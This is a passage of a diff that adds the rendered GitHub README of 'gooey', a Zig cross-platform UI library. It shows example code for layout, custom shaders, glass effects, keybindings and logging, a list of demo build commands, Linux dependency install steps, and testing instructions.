+    .<span>alignment</span> <span>=</span> .{ .<span>main</span> <span>=</span> <span>.space_between</span>, .<span>cross</span> <span>=</span> <span>.center</span> },
+    .<span>fill_width</span> <span>=</span> <span>true</span>,
+    .<span>grow</span> <span>=</span> <span>true</span>,
+}, .{<span>...</span>}));
+
+<span>// Childless boxes — use ui.rect() for dividers, spacers, colored blocks</span>
+<span>ui</span>.<span>rect</span>(.{ .<span>width</span> <span>=</span> <span>1</span>, .<span>height</span> <span>=</span> <span>18</span>, .<span>background</span> <span>=</span> <span>t</span>.<span>border</span> })  <span>// divider</span>
+<span>ui</span>.<span>rect</span>(.{ .<span>grow</span> <span>=</span> <span>true</span> })                                       <span>// spacer</span>
+<span>ui</span>.<span>rect</span>(.{ .<span>width</span> <span>=</span> <span>40</span>, .<span>height</span> <span>=</span> <span>40</span>, .<span>background</span> <span>=</span> <span>color</span>, .<span>corner_radius</span> <span>=</span> <span>4</span> })
+
+<span>// Shrink behavior - elements shrink when container is too small</span>
+<span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{ .<span>width</span> <span>=</span> <span>150</span>, .<span>min_width</span> <span>=</span> <span>60</span> }, .{<span>...</span>}));
+
+<span>// Text wrapping</span>
+<span>ui</span>.<span>text</span>(<span>&#34;Long text...&#34;</span>, .{ .<span>wrap</span> <span>=</span> <span>.words</span> });  <span>// .none, .words, .newlines</span></pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Custom Shaders</h2><a aria-label="Permalink: Custom Shaders" href="#custom-shaders" id="user-content-custom-shaders"></a></p>
+<p dir="auto">Add custom post-processing shaders for visual effects. Shaders are cross-platform with MSL for macOS and WGSL for web:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="// MSL shader (macOS)
+pub const plasma_msl =
+    \\\\void mainImage(thread float4&amp; fragColor, float2 fragCoord,
+    \\\\               constant ShaderUniforms&amp; uniforms,
+    \\\\               texture2d&lt;float&gt; iChannel0,
+    \\\\               sampler iChannel0Sampler) {
+    \\\\    float2 uv = fragCoord / uniforms.iResolution.xy;
+    \\\\    float time = uniforms.iTime;
+    \\\\    // ... shader code
+    \\\\    fragColor = float4(color, 1.0);
+    \\\\}
+;
+
+// WGSL shader (Web)
+pub const plasma_wgsl =
+    \\\\fn mainImage(
+    \\\\    fragCoord: vec2&lt;f32&gt;,
+    \\\\    u: ShaderUniforms,
+    \\\\    tex: texture_2d&lt;f32&gt;,
+    \\\\    samp: sampler
+    \\\\) -&gt; vec4&lt;f32&gt; {
+    \\\\    let uv = fragCoord / u.iResolution.xy;
+    \\\\    let time = u.iTime;
+    \\\\    // ... shader code
+    \\\\    return vec4&lt;f32&gt;(color, 1.0);
+    \\\\}
+;
+
+try gooey.runCx(AppState, &amp;state, render, .{
+    .custom_shaders = &amp;.{.{ .msl = plasma_msl, .wgsl = plasma_wgsl }},
+});"><pre><span>// MSL shader (macOS)</span>
+<span>pub</span> <span>const</span> <span>plasma_msl</span> <span>=</span>
+    <span>\\\\void mainImage(thread float4&amp; fragColor, float2 fragCoord,</span>
+    <span>\\\\               constant ShaderUniforms&amp; uniforms,</span>
+    <span>\\\\               texture2d&lt;float&gt; iChannel0,</span>
+    <span>\\\\               sampler iChannel0Sampler) {</span>
+    <span>\\\\    float2 uv = fragCoord / uniforms.iResolution.xy;</span>
+    <span>\\\\    float time = uniforms.iTime;</span>
+    <span>\\\\    // ... shader code</span>
+    <span>\\\\    fragColor = float4(color, 1.0);</span>
+    <span>\\\\}</span>
+;
+
+<span>// WGSL shader (Web)</span>
+<span>pub</span> <span>const</span> <span>plasma_wgsl</span> <span>=</span>
+    <span>\\\\fn mainImage(</span>
+    <span>\\\\    fragCoord: vec2&lt;f32&gt;,</span>
+    <span>\\\\    u: ShaderUniforms,</span>
+    <span>\\\\    tex: texture_2d&lt;f32&gt;,</span>
+    <span>\\\\    samp: sampler</span>
+    <span>\\\\) -&gt; vec4&lt;f32&gt; {</span>
+    <span>\\\\    let uv = fragCoord / u.iResolution.xy;</span>
+    <span>\\\\    let time = u.iTime;</span>
+    <span>\\\\    // ... shader code</span>
+    <span>\\\\    return vec4&lt;f32&gt;(color, 1.0);</span>
+    <span>\\\\}</span>
+;
+
+<span>try</span> <span>gooey</span>.<span>runCx</span>(<span>AppState</span>, <span>&amp;</span><span>state</span>, <span>render</span>, .{
+    .<span>custom_shaders</span> <span>=</span> &amp;.{.{ .<span>msl</span> <span>=</span> <span>plasma_msl</span>, .<span>wgsl</span> <span>=</span> <span>plasma_wgsl</span> }},
+});</pre></div>
+<p dir="auto">You can also provide only one platform&#39;s shader:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="// macOS only
+.custom_shaders = &amp;.{.{ .msl = plasma_msl }},
+
+// Web only
+.custom_shaders = &amp;.{.{ .wgsl = plasma_wgsl }},"><pre><span>// macOS only</span>
+.<span>custom_shaders</span> <span>=</span> &amp;.{.{ .<span>msl</span> <span>=</span> <span>plasma_msl</span> }},
+
+<span>// Web only</span>
+.<span>custom_shaders</span> <span>=</span> &amp;.{.{ .<span>wgsl</span> <span>=</span> <span>plasma_wgsl</span> }},</pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Glass Effect (macOS 26.0+)</h2><a aria-label="Permalink: Glass Effect (macOS 26.0+)" href="#glass-effect-macos-260" id="user-content-glass-effect-macos-260"></a></p>
+<p dir="auto">Transparent window with liquid glass effect:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="try gooey.runCx(AppState, &amp;state, render, .{
+    .title = &#34;Glass Demo&#34;,
+    .background_color = gooey.Color.rgba(0.1, 0.1, 0.15, 1.0),
+    .background_opacity = 0.2,
+    .glass_style = .glass_regular,  // .glass_clear, .blur, .none
+    .glass_corner_radius = 10.0,
+    .titlebar_transparent = true,
+});
+
+// Change glass style at runtime
+pub fn cycleStyle(self: *AppState, g: *gooey.Gooey) void {
+    g.window.setGlassStyle(.glass_clear, 0.7, 10.0);
+}"><pre><span>try</span> <span>gooey</span>.<span>runCx</span>(<span>AppState</span>, <span>&amp;</span><span>state</span>, <span>render</span>, .{
+    .<span>title</span> <span>=</span> <span>&#34;Glass Demo&#34;</span>,
+    .<span>background_color</span> <span>=</span> <span>gooey</span>.<span>Color</span>.<span>rgba</span>(<span>0.1</span>, <span>0.1</span>, <span>0.15</span>, <span>1.0</span>),
+    .<span>background_opacity</span> <span>=</span> <span>0.2</span>,
+    .<span>glass_style</span> <span>=</span> <span>.glass_regular</span>,  <span>// .glass_clear, .blur, .none</span>
+    .<span>glass_corner_radius</span> <span>=</span> <span>10.0</span>,
+    .<span>titlebar_transparent</span> <span>=</span> <span>true</span>,
+});
+
+<span>// Change glass style at runtime</span>
+<span>pub</span> <span>fn</span> <span>cycleStyle</span>(<span>self</span>: <span>*</span><span>AppState</span>, <span>g</span>: <span>*</span><span>gooey.Gooey</span>) <span>void</span> {
+    <span>g</span>.<span>window</span>.<span>setGlassStyle</span>(<span>.glass_clear</span>, <span>0.7</span>, <span>10.0</span>);
+}</pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Actions &amp; Keybindings</h2><a aria-label="Permalink: Actions &amp; Keybindings" href="#actions--keybindings" id="user-content-actions--keybindings"></a></p>
+<p dir="auto">Contextual action system with keyboard shortcuts:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const Undo = struct {};
+const Save = struct {};
+
+fn setupKeymap(cx: *Cx) void {
+    const g = cx.gooey();
+    g.keymap.bind(Undo, &#34;cmd-z&#34;, null);        // Global
+    g.keymap.bind(Save, &#34;cmd-s&#34;, &#34;Editor&#34;);    // Context-specific
+}
+
+fn render(cx: *Cx) void {
+    cx.render(ui.box(.{}, .{
+        ui.onAction(Undo, doUndo),  // Handle action
+
+        // Scoped context
+        ui.keyContext(&#34;Editor&#34;),
+        ui.onAction(Save, doSave),
+    }));
+}"><pre><span>const</span> <span>Undo</span> <span>=</span> <span>struct</span> {};
+<span>const</span> <span>Save</span> <span>=</span> <span>struct</span> {};
+
+<span>fn</span> <span>setupKeymap</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>g</span> <span>=</span> <span>cx</span>.<span>gooey</span>();
+    <span>g</span>.<span>keymap</span>.<span>bind</span>(<span>Undo</span>, <span>&#34;cmd-z&#34;</span>, <span>null</span>);        <span>// Global</span>
+    <span>g</span>.<span>keymap</span>.<span>bind</span>(<span>Save</span>, <span>&#34;cmd-s&#34;</span>, <span>&#34;Editor&#34;</span>);    <span>// Context-specific</span>
+}
+
+<span>fn</span> <span>render</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{}, .{
+        <span>ui</span>.<span>onAction</span>(<span>Undo</span>, <span>doUndo</span>),  <span>// Handle action</span>
+
+        <span>// Scoped context</span>
+        <span>ui</span>.<span>keyContext</span>(<span>&#34;Editor&#34;</span>),
+        <span>ui</span>.<span>onAction</span>(<span>Save</span>, <span>doSave</span>),
+    }));
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Quitting the App</h3><a aria-label="Permalink: Quitting the App" href="#quitting-the-app" id="user-content-quitting-the-app"></a></p>
+<p dir="auto">Use <code>g.quit()</code> from a <code>cx.command()</code> handler to quit portably across macOS, Linux, and WASM (no-op).</p>
+<p dir="auto">Both <code>ui.onActionHandler</code> and <code>Button.on_click_handler</code> accept a <code>HandlerRef</code>, so the same <code>cx.command()</code> handler works for both the keybinding and the button:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const QuitApp = struct {};
+
+const AppState = struct {
+    initialized: bool = false,
+
+    fn quitApp(_: *AppState, g: *gooey.Gooey) void {
+        g.quit();
+    }
+};
+
+fn setupKeymap(cx: *Cx) void {
+    const s = cx.state(AppState);
+    if (s.initialized) return;
+    s.initialized = true;
+
+    cx.gooey().keymap.bind(QuitApp, &#34;cmd-q&#34;, null);
+}
+
+fn render(cx: *Cx) void {
+    setupKeymap(cx);
+
+    const quit_handler = cx.command(AppState.quitApp);
+
+    cx.render(ui.box(.{ .padding = .{ .all = 24 }, .gap = 16 }, .{
+        // cmd+q triggers quitApp via the action system
+        ui.onActionHandler(QuitApp, quit_handler),
+
+        // Button triggers the same handler on click
+        Button{
+            .label = &#34;Quit&#34;,
+            .variant = .danger,
+            .on_click_handler = quit_handler,
+        },
+    }));
+}"><pre><span>const</span> <span>QuitApp</span> <span>=</span> <span>struct</span> {};
+
+<span>const</span> <span>AppState</span> <span>=</span> <span>struct</span> {
+    <span>initialized</span>: <span>bool</span> <span>=</span> <span>false</span>,
+
+    <span>fn</span> <span>quitApp</span>(<span>_</span>: <span>*</span><span>AppState</span>, <span>g</span>: <span>*</span><span>gooey.Gooey</span>) <span>void</span> {
+        <span>g</span>.<span>quit</span>();
+    }
+};
+
+<span>fn</span> <span>setupKeymap</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>state</span>(<span>AppState</span>);
+    <span>if</span> (<span>s</span>.<span>initialized</span>) <span>return</span>;
+    <span>s</span>.<span>initialized</span> <span>=</span> <span>true</span>;
+
+    <span>cx</span>.<span>gooey</span>().<span>keymap</span>.<span>bind</span>(<span>QuitApp</span>, <span>&#34;cmd-q&#34;</span>, <span>null</span>);
+}
+
+<span>fn</span> <span>render</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>setupKeymap</span>(<span>cx</span>);
+
+    <span>const</span> <span>quit_handler</span> <span>=</span> <span>cx</span>.<span>command</span>(<span>AppState</span>.<span>quitApp</span>);
+
+    <span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{ .<span>padding</span> <span>=</span> .{ .<span>all</span> <span>=</span> <span>24</span> }, .<span>gap</span> <span>=</span> <span>16</span> }, .{
+        <span>// cmd+q triggers quitApp via the action system</span>
+        <span>ui</span>.<span>onActionHandler</span>(<span>QuitApp</span>, <span>quit_handler</span>),
+
+        <span>// Button triggers the same handler on click</span>
+        <span>Button</span>{
+            .<span>label</span> <span>=</span> <span>&#34;Quit&#34;</span>,
+            .<span>variant</span> <span>=</span> <span>.danger</span>,
+            .<span>on_click_handler</span> <span>=</span> <span>quit_handler</span>,
+        },
+    }));
+}</pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">More Examples</h2><a aria-label="Permalink: More Examples" href="#more-examples" id="user-content-more-examples"></a></p>
+<markdown-accessiblity-table><table>
+<thead>
+<tr>
+<th>Example</th>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Showcase</td>
+<td><code>zig build run</code></td>
+<td>Full feature demo with navigation</td>
+</tr>
+<tr>
+<td>Counter</td>
+<td><code>zig build run-counter</code></td>
+<td>Simple state management</td>
+</tr>
+<tr>
+<td>Animation</td>
+<td><code>zig build run-animation</code></td>
+<td>Animation system with animateOn</td>
+</tr>
+<tr>
+<td>Pomodoro</td>
+<td><code>zig build run-pomodoro</code></td>
+<td>Timer with tasks and custom shader</td>
+</tr>
+<tr>
+<td>Dynamic Counters</td>
+<td><code>zig build run-dynamic-counters</code></td>
+<td>Entity creation and deletion</td>
+</tr>
+<tr>
+<td>Layout</td>
+<td><code>zig build run-layout</code></td>
+<td>Flexbox, shrink, text wrapping</td>
+</tr>
+<tr>
+<td>Glass</td>
+<td><code>zig build run-glass</code></td>
+<td>Liquid glass transparency effect</td>
+</tr>
+<tr>
+<td>Spaceship</td>
+<td><code>zig build run-spaceship</code></td>
+<td>Sci-fi dashboard with hologram shader</td>
+</tr>
+<tr>
+<td>Actions</td>
+<td><code>zig build run-actions</code></td>
+<td>Keybindings and action system</td>
+</tr>
+<tr>
+<td>Select</td>
+<td><code>zig build run-select</code></td>
+<td>Dropdown select component</td>
+</tr>
+<tr>
+<td>Tooltip</td>
+<td><code>zig build run-tooltip</code></td>
+<td>Tooltip positioning and styling</td>
+</tr>
+<tr>
+<td>Modal</td>
+<td><code>zig build run-modal</code></td>
+<td>Modal dialogs with animation</td>
+</tr>
+<tr>
+<td>Images</td>
+<td><code>zig build run-images</code></td>
+<td>Image loading and effects</td>
+</tr>
+<tr>
+<td>File Dialog</td>
+<td><code>zig build run-file-dialog</code></td>
+<td>Native file open/save dialogs</td>
+</tr>
+<tr>
+<td>A11y Demo</td>
+<td><code>zig build run-a11y-demo</code></td>
+<td>VoiceOver accessibility demo</td>
+</tr>
+<tr>
+<td>Accessible Form</td>
+<td><code>zig build run-accessible-form</code></td>
+<td>Complete accessible form example</td>
+</tr>
+<tr>
+<td>Drag &amp; Drop</td>
+<td><code>zig build run-drag-drop</code></td>
+<td>Draggable items and drop targets</td>
+</tr>
+<tr>
+<td>Uniform List</td>
+<td><code>zig build run-uniform-list</code></td>
+<td>Virtualized list with 10,000 items</td>
+</tr>
+<tr>
+<td>Virtual List</td>
+<td><code>zig build run-virtual-list</code></td>
+<td>Variable-height virtualized list</td>
+</tr>
+<tr>
+<td>Data Table</td>
+<td><code>zig build run-data-table</code></td>
+<td>Virtualized table with 10,000 rows</td>
+</tr>
+<tr>
+<td>Code Editor</td>
+<td><code>zig build run-code-editor</code></td>
+<td>Code editor with syntax highlighting</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">See <a href="https://github.com/duanebester/gooey/blob/main/docs/accessibility.md">docs/accessibility.md</a> for comprehensive accessibility documentation.</p>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Logging</h2><a aria-label="Permalink: Logging" href="#logging" id="user-content-logging"></a></p>
+<p dir="auto">Two options for cross-platform logging (native + WASM):</p>
+<p dir="auto"><strong>Option A: <code>gooey.std_options</code></strong> — one-liner for <code>std.log</code> compatibility:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const gooey = @import(&#34;gooey&#34;);
+
+// Routes std.log through console.log on WASM, default on native
+pub const std_options = gooey.std_options;"><pre><span>const</span> <span>gooey</span> <span>=</span> <span>@import</span>(<span>&#34;gooey&#34;</span>);
+
+<span>// Routes std.log through console.log on WASM, default on native</span>
+<span>pub</span> <span>const</span> <span>std_options</span> <span>=</span> <span>gooey</span>.<span>std_options</span>;</pre></div>
+<p dir="auto"><strong>Option B: <code>gooey.log</code></strong> — zero-config, no <code>std_options</code> needed:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const log = gooey.log.scoped(.myapp);
+
+log.info(&#34;connected to {s}&#34;, .{host});
+log.err(&#34;request failed: {}&#34;, .{code});"><pre><span>const</span> <span>log</span> <span>=</span> <span>gooey</span>.<span>log</span>.<span>scoped</span>(<span>.myapp</span>);
+
+<span>log</span>.<span>info</span>(<span>&#34;connected to {s}&#34;</span>, .{<span>host</span>});
+<span>log</span>.<span>err</span>(<span>&#34;request failed: {}&#34;</span>, .{<span>code</span>});</pre></div>
+<p dir="auto">On native, <code>gooey.log</code> delegates to <code>std.log.scoped()</code>. On WASM, it writes directly to the browser console. Use option A if you need third-party libraries to log through <code>std.log</code>. Use option B if you just want logging that works everywhere.</p>
+<p dir="auto"><h2 tabindex="-1" dir="auto">WASM</h2><a aria-label="Permalink: WASM" href="#wasm" id="user-content-wasm"></a></p>
+<blockquote>
+<p dir="auto"><strong><g-emoji alias="warning">⚠️</g-emoji> Temporarily deferred on Zig 0.16.0 (upstream <code>Io.Threaded</code>).</strong>
+<code>std.Io.Threaded</code> does not compile for <code>wasm32-freestanding</code> on Zig 0.16.0 —
+its comptime body eagerly references <code>posix.system.getrandom</code> and
+<code>posix.IOV_MAX</code>, which resolve to <code>void</code>/absent on that target. This is an
+upstream issue, not a Gooey one. The <code>zig build wasm*</code> steps have been removed
+from <code>build.zig</code> (the commands no longer exist), while the web code paths
+(<code>src/platform/web/</code>, <code>WebApp</code> in <code>app.zig</code>, and <code>src/examples/*_wasm.zig</code>) are
+deliberately left in place to resume compiling once upstream gates those
+references. Tracking: <a href="https://github.com/duanebester/gooey/blob/main/docs/zig-0.16-io-migration.md"><code>docs/zig-0.16-io-migration.md</code></a>.</p>
+</blockquote>
+<p dir="auto">Once the upstream fix lands, the WASM build steps will be restored. The commands
+below are the intended interface — <strong>currently inactive</strong>:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="# (currently disabled — see the note above)
+# zig build wasm                 # showcase
+# zig build wasm-counter
+# zig build wasm-dynamic-counters
+# zig build wasm-pomodoro
+# zig build wasm-spaceship
+# zig build wasm-layout
+# zig build wasm-select
+# zig build wasm-tooltip
+# zig build wasm-modal
+# zig build wasm-images
+# zig build wasm-file-dialog
+
+# Run with a local server
+# python3 -m http.server 8080 -d zig-out/web"><pre><span><span>#</span> (currently disabled — see the note above)</span>
+<span><span>#</span> zig build wasm                 # showcase</span>
+<span><span>#</span> zig build wasm-counter</span>
+<span><span>#</span> zig build wasm-dynamic-counters</span>
+<span><span>#</span> zig build wasm-pomodoro</span>
+<span><span>#</span> zig build wasm-spaceship</span>
+<span><span>#</span> zig build wasm-layout</span>
+<span><span>#</span> zig build wasm-select</span>
+<span><span>#</span> zig build wasm-tooltip</span>
+<span><span>#</span> zig build wasm-modal</span>
+<span><span>#</span> zig build wasm-images</span>
+<span><span>#</span> zig build wasm-file-dialog</span>
+
+<span><span>#</span> Run with a local server</span>
+<span><span>#</span> python3 -m http.server 8080 -d zig-out/web</span></pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Hot Reloading (macOS)</h2><a aria-label="Permalink: Hot Reloading (macOS)" href="#hot-reloading-macos" id="user-content-hot-reloading-macos"></a></p>
+<p dir="auto">Simple brute-force hot reload for development:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="zig build hot                    # Showcase (default)
+zig build hot -- run-counter     # Specific example
+zig build hot -- run-pomodoro
+zig build hot -- run-glass"><pre>zig build hot                    <span><span>#</span> Showcase (default)</span>
+zig build hot -- run-counter     <span><span>#</span> Specific example</span>
+zig build hot -- run-pomodoro
+zig build hot -- run-glass</pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Architecture</h2><a aria-label="Permalink: Architecture" href="#architecture" id="user-content-architecture"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="src/
+├── app.zig          # App entry points (runCx, App, WebApp)
+├── cx.zig           # Unified context (Cx)
+├── root.zig         # Public API exports
+│
+├── core/            # Foundational types (geometry, events, shaders)
+├── input/           # Input handling (events, actions, keymaps)
+├── scene/           # GPU primitives (scene graph, batching)
+├── context/         # App context (focus, entity, dispatch, widget store)
+├── animation/       # Animation system and easing
+├── debug/           # Debugging tools and render stats
+│
+├── ui/              # Declarative builder (box, vstack, hstack, primitives)
+├── components/      # UI components (Button, TextInput, Modal, Tooltip, etc.)
+├── widgets/         # Stateful widget implementations (text input/area state)
+├── layout/          # Flexbox-style layout engine
+│
+├── text/            # Text rendering (CoreText, FreeType/HarfBuzz, Canvas)
+├── image/           # Image loading and atlas management
+├── svg/             # SVG rasterization (CoreGraphics, Linux, Canvas)
+├── platform/        # macOS/Metal, Linux/Vulkan/Wayland, WASM/WebGPU
+├── runtime/         # Frame rendering and input handling
+└── examples/        # Demo applications"><pre>src/
+├── app.zig          # App entry points (runCx, App, WebApp)
+├── cx.zig           # Unified context (Cx)
+├── root.zig         # Public API exports
+│
+├── core/            # Foundational types (geometry, events, shaders)
+├── input/           # Input handling (events, actions, keymaps)
+├── scene/           # GPU primitives (scene graph, batching)
+├── context/         # App context (focus, entity, dispatch, widget store)
+├── animation/       # Animation system and easing
+├── debug/           # Debugging tools and render stats
+│
+├── ui/              # Declarative builder (box, vstack, hstack, primitives)
+├── components/      # UI components (Button, TextInput, Modal, Tooltip, etc.)
+├── widgets/         # Stateful widget implementations (text input/area state)
+├── layout/          # Flexbox-style layout engine
+│
+├── text/            # Text rendering (CoreText, FreeType/HarfBuzz, Canvas)
+├── image/           # Image loading and atlas management
+├── svg/             # SVG rasterization (CoreGraphics, Linux, Canvas)
+├── platform/        # macOS/Metal, Linux/Vulkan/Wayland, WASM/WebGPU
+├── runtime/         # Frame rendering and input handling
+└── examples/        # Demo applications</pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Linux Platform</h2><a aria-label="Permalink: Linux Platform" href="#linux-platform" id="user-content-linux-platform"></a></p>
+<p dir="auto">Gooey has full Linux support using Wayland and Vulkan. The showcase and all demos run on Linux.</p>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Architecture</h3><a aria-label="Permalink: Architecture" href="#architecture-1" id="user-content-architecture-1"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="Linux Platform Stack:
+┌─────────────────────────────────────┐
+│         gooey Application           │
+├─────────────────────────────────────┤
+│  LinuxPlatform  │  Window           │
+│  (event loop)   │  (XDG shell)      │
+├─────────────────────────────────────┤
+│  VulkanRenderer │  SceneRenderer    │
+│  (direct Vulkan, GLSL shaders)      │
+├─────────────────────────────────────┤
+│  Wayland Client  │  Vulkan Driver   │
+└─────────────────────────────────────┘"><pre>Linux Platform Stack:
+┌─────────────────────────────────────┐
+│         gooey Application           │
+├─────────────────────────────────────┤
+│  LinuxPlatform  │  Window           │
+│  (event loop)   │  (XDG shell)      │
+├─────────────────────────────────────┤
+│  VulkanRenderer │  SceneRenderer    │
+│  (direct Vulkan, GLSL shaders)      │
+├─────────────────────────────────────┤
+│  Wayland Client  │  Vulkan Driver   │
+└─────────────────────────────────────┘</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">What&#39;s Implemented ✓</h3><a aria-label="Permalink: What&#39;s Implemented ✓" href="#whats-implemented-" id="user-content-whats-implemented-"></a></p>
+<markdown-accessiblity-table><table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Implementation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Windowing</strong></td>
+<td>Wayland via XDG shell (xdg-toplevel, xdg-decoration)</td>
+</tr>
+<tr>
+<td><strong>GPU Rendering</strong></td>
+<td>Direct Vulkan with GLSL shaders (unified, text, svg, image pipelines)</td>
+</tr>
+<tr>
+<td><strong>Text Rendering</strong></td>
+<td>FreeType for rasterization, HarfBuzz for shaping, Fontconfig for font discovery</td>
+</tr>
+<tr>
+<td><strong>Input Handling</strong></td>
+<td>Full keyboard (evdev keycodes), mouse, scroll with modifier support</td>
+</tr>
+<tr>
+<td><strong>Clipboard</strong></td>
+<td>Wayland data-device protocol (copy/paste text)</td>
+</tr>
+<tr>
+<td><strong>File Dialogs</strong></td>
+<td>XDG Desktop Portal via D-Bus (open, save, directory selection)</td>
+</tr>
+<tr>
+<td><strong>IME Support</strong></td>
+<td>zwp_text_input_v3 protocol for international text input</td>
+</tr>
+<tr>
+<td><strong>HiDPI</strong></td>
+<td>wp_viewporter protocol with scale factor support</td>
+</tr>
+<tr>
+<td><strong>Server Decorations</strong></td>
+<td>zxdg-decoration-manager-v1 protocol</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Key Design Decisions</h3><a aria-label="Permalink: Key Design Decisions" href="#key-design-decisions" id="user-content-key-design-decisions"></a></p>
+<ol dir="auto">
+<li><strong>Wayland-only</strong> - No X11 fallback (modern approach like Ghostty)</li>
+<li><strong>Direct Vulkan</strong> - No wgpu-native dependency, full control over rendering</li>
+<li><strong>Native text stack</strong> - FreeType/HarfBuzz/Fontconfig (same as most Linux apps)</li>
+<li><strong>XDG Portal integration</strong> - Native file dialogs that respect user&#39;s desktop environment</li>
+</ol>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Dependencies Required</h3><a aria-label="Permalink: Dependencies Required" href="#dependencies-required" id="user-content-dependencies-required"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="# System packages (Debian/Ubuntu)
+sudo apt install \\
+    libwayland-dev \\
+    libvulkan-dev \\
+    libfreetype-dev \\
+    libharfbuzz-dev \\
+    libfontconfig-dev \\
+    libpng-dev \\
+    libdbus-1-dev
+
+# Fedora/RHEL
+sudo dnf install \\
+    wayland-devel \\
+    vulkan-loader-devel \\
+    freetype-devel \\
+    harfbuzz-devel \\
+    fontconfig-devel \\
+    libpng-devel \\
+    dbus-devel
+
+# Arch Linux
+sudo pacman -S \\
+    wayland \\
+    vulkan-icd-loader \\
+    vulkan-headers \\
+    freetype2 \\
+    harfbuzz \\
+    fontconfig \\
+    libpng \\
+    dbus"><pre><span><span>#</span> System packages (Debian/Ubuntu)</span>
+sudo apt install \\
+    libwayland-dev \\
+    libvulkan-dev \\
+    libfreetype-dev \\
+    libharfbuzz-dev \\
+    libfontconfig-dev \\
+    libpng-dev \\
+    libdbus-1-dev
+
+<span><span>#</span> Fedora/RHEL</span>
+sudo dnf install \\
+    wayland-devel \\
+    vulkan-loader-devel \\
+    freetype-devel \\
+    harfbuzz-devel \\
+    fontconfig-devel \\
+    libpng-devel \\
+    dbus-devel
+
+<span><span>#</span> Arch Linux</span>
+sudo pacman -S \\
+    wayland \\
+    vulkan-icd-loader \\
+    vulkan-headers \\
+    freetype2 \\
+    harfbuzz \\
+    fontconfig \\
+    libpng \\
+    dbus</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Building &amp; Running</h3><a aria-label="Permalink: Building &amp; Running" href="#building--running" id="user-content-building--running"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="# Build and run the showcase
+zig build run
+
+# Run specific demos
+zig build run-basic        # Simple Wayland + Vulkan test
+zig build run-text         # Text rendering demo
+zig build run-file-dialog  # XDG portal file dialogs
+
+# Compile shaders (only needed if you modify GLSL sources)
+zig build compile-shaders"><pre><span><span>#</span> Build and run the showcase</span>
+zig build run
+
+<span><span>#</span> Run specific demos</span>
+zig build run-basic        <span><span>#</span> Simple Wayland + Vulkan test</span>
+zig build run-text         <span><span>#</span> Text rendering demo</span>
+zig build run-file-dialog  <span><span>#</span> XDG portal file dialogs</span>
+
+<span><span>#</span> Compile shaders (only needed if you modify GLSL sources)</span>
+zig build compile-shaders</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">What&#39;s Left / Known Limitations</h3><a aria-label="Permalink: What&#39;s Left / Known Limitations" href="#whats-left--known-limitations" id="user-content-whats-left--known-limitations"></a></p>
+<ol dir="auto">
+<li><strong>Custom cursors</strong> - Cursor theming via wl_cursor not yet implemented</li>
+<li><strong>Hot reloading</strong> - macOS-only currently (uses FSEvents)</li>
+<li><strong>Glass effects</strong> - macOS-specific (compositor-dependent on Linux)</li>
+<li><strong>Multi-window</strong> - Supported in platform but not fully tested</li>
+</ol>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Testing &amp; CI</h2><a aria-label="Permalink: Testing &amp; CI" href="#testing--ci" id="user-content-testing--ci"></a></p>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Running Tests</h3><a aria-label="Permalink: Running Tests" href="#running-tests" id="user-content-running-tests"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="# Run all tests
+zig build test
+
+# Run tests under valgrind (Linux only - detects memory leaks)
+zig build test-valgrind
+
+# Check code formatting
+zig fmt --check src/ charts/"><pre><span><span>#</span> Run all tests</span>
+zig build <span>test</span>
+
+<span><span>#</span> Run tests under valgrind (Linux only - detects memory leaks)</span>
+zig build test-valgrind
+
+<span><span>#</span> Check code formatting</span>
+zig fmt --check src/ charts/</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Continuous Integration</h3><a aria-label="Permalink: Continuous Integration" href="#continuous-integration" id="user-content-continuous-integration"></a></p>
+<p dir="auto">The project uses GitHub Actions for CI. Every push and pull request runs:</p>
+<markdown-accessiblity-table><table>
+<thead>
+<tr>
+<th>Job</th>
+<th>Platform</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
